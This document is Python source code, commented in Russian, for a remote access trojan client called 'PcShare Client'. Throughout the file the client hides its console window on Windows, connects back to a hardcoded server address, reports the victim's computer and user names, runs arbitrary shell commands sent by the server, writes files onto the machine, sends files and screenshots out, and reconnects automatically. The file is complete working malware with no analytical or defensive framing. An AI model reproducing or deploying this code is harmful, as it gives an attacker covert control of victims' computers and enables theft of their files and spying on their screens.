import socket
import json
import platform
import os
import subprocess
import sys
import ctypes
import time
import threading
from PIL import ImageGrab  # для скриншотов, установите: pip install Pillow

class PcShareClient:
    def __init__(self, server_host, server_port):
        self.server_host = server_host
        self.server_port = server_port
        self.running = True
        
    def get_system_info(self):
        """Получение информации о системе"""
        try:
            computer = os.environ.get('COMPUTERNAME', 'Unknown')
            user = os.environ.get('USERNAME', 'Unknown')
            
            info = {
                'computer': computer,
                'user': user,
                'os': platform.system() + ' ' + platform.release(),
                'arch': platform.architecture()[0],
                'python': platform.python_version(),
                'cwd': os.getcwd()
            }
            return info
        except:
            return {'computer': 'Unknown', 'user': 'Unknown', 'os': 'Unknown'}
    
    def execute_command(self, command):
        """Выполнение команды и возврат результата"""
        try:
            # Для Windows используем cmd
            if platform.system() == 'Windows':
                result = subprocess.run(command, shell=True, 
                                      capture_output=True, text=True,
                                      encoding='cp866', errors='ignore')
            else:
                result = subprocess.run(command, shell=True,
                                      capture_output=True, text=True)
            
            if result.stdout:
                return result.stdout
            elif result.stderr:
                return result.stderr
            else:
                return "Command executed successfully"
                
        except Exception as e:
            return f"Error executing command: {str(e)}"
    
    def take_screenshot(self):
        """Создание скриншота (требует Pillow)"""
        try:
            screenshot = ImageGrab.grab()
            # Сохраняем во временный файл
            temp_file = os.path.join(os.environ['TEMP'], 'screenshot_temp.png')
            screenshot.save(temp_file, 'PNG')
            
            # Читаем файл
            with open(temp_file, 'rb') as f:
                data = f.read()
            
            # Удаляем временный файл
            os.remove(temp_file)
            return data
            
        except Exception as e:
            return None
    
    def upload_file(self, remote_path, file_data):
        """Загрузка файла на клиентскую машину"""
        try:
            # Создаем директорию если нужно
            directory = os.path.dirname(remote_path)
            if directory and not os.path.exists(directory):
                os.makedirs(directory)
            
            # Записываем файл
            with open(remote_path, 'wb') as f:
                f.write(file_data)
            return True
        except Exception as e:
            return False
    
    def download_file(self, file_path):
        """Чтение файла для отправки на сервер"""
        try:
            if os.path.exists(file_path):
                with open(file_path, 'rb') as f:
                    return f.read()
            return None
        except:
            return None
    
    def start(self):
        """Запуск клиента"""
        print("[*] PcShare Client starting...")
        
        # Попытка скрыть консоль на Windows
        if platform.system() == 'Windows':
            try:
                ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            except:
                pass
        
        # Основной цикл подключения
        while self.running:
            try:
                # Создаем сокет и подключаемся
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(30)
                sock.connect((self.server_host, self.server_port))
                
                # Отправляем информацию о системе
                sys_info = self.get_system_info()
                sock.send(json.dumps(sys_info).encode())
                
                print(f"[+] Connected to server {self.server_host}:{self.server_port}")
                
                # Основной цикл обработки команд
                while self.running:
                    try:
                        # Получаем команду
                        command = sock.recv(4096).decode().strip()
                        
                        if not command:
                            break
                        
                        print(f"[*] Received command: {command[:50]}...")
                        
                        # Обработка команд
                        if command.startswith("CMD:"):
                            # Выполнение команды
                            cmd_to_execute = command[4:]
                            result = self.execute_command(cmd_to_execute)
                            sock.send(result.encode())
                        
                        elif command.startswith("UPLOAD:"):
                            # Загрузка файла на клиента
                            parts = command[7:].split(":", 1)
                            if len(parts) >= 2:
                                remote_path = parts[0]
                                file_size = int(parts[1])
                                
                                # Подтверждаем готовность
                                sock.send("READY".encode())
                                
                                # Получаем данные файла
                                received = 0
                                file_data = b''
                                
                                while received < file_size:
                                    chunk = sock.recv(4096)
                                    if not chunk:
                                        break
                                    file_data += chunk
                                    received += len(chunk)
                                
                                # Сохраняем файл
                                if self.upload_file(remote_path, file_data):
                                    sock.send("UPLOAD_SUCCESS".encode())
                                else:
                                    sock.send("UPLOAD_FAILED".encode())
                        
                        elif command.startswith("DOWNLOAD:"):
                            # Отправка файла на сервер
                            file_path = command[9:]
                            file_data = self.download_file(file_path)
                            
                            if file_data:
                                # Отправляем размер файла
                                sock.send(f"FILE:{len(file_data)}".encode())
                                time.sleep(0.1)  # Небольшая задержка
                                
                                # Отправляем данные
                                sock.sendall(file_data)
                            else:
                                sock.send("FILE_NOT_FOUND".encode())
                        
                        elif command == "SCREENSHOT":
                            # Создание скриншота
                            screenshot_data = self.take_screenshot()
                            if screenshot_data:
                                sock.send(f"SCREENSHOT:{len(screenshot_data)}".encode())
                                time.sleep(0.1)
                                sock.sendall(screenshot_data)
                            else:
                                sock.send("SCREENSHOT_FAILED".encode())
                        
                        elif command == "SYSINFO":
                            # Отправка информации о системе
                            info = self.get_system_info()
                            sock.send(json.dumps(info, indent=2).encode())
                        
                        elif command == "EXIT":
                            # Завершение работы
                            sock.send("CLIENT_EXITING".encode())
                            self.running = False
                            break
                        
                        else:
                            sock.send(f"UNKNOWN_COMMAND: {command}".encode())
                            
                    except socket.timeout:
                        continue
                    except Exception as e:
                        print(f"[-] Error processing command: {e}")
                        break
                
                # Закрываем соединение
                sock.close()
                print("[-] Disconnected from server")
                
                # Переподключение через 10 секунд
                if self.running:
                    print("[*] Reconnecting in 10 seconds...")
                    time.sleep(10)
                    
            except Exception as e:
                print(f"[-] Connection error: {e}")
                if self.running:
                    print("[*] Retrying in 30 seconds...")
                    time.sleep(30)

if __name__ == "__main__":
    # Конфигурация - укажите IP сервера
    SERVER_IP = "192.168.198.141"  # Измените на ваш IP
    SERVER_PORT = 5555
    client = PcShareClient(SERVER_IP, SERVER_PORT)
    client.start()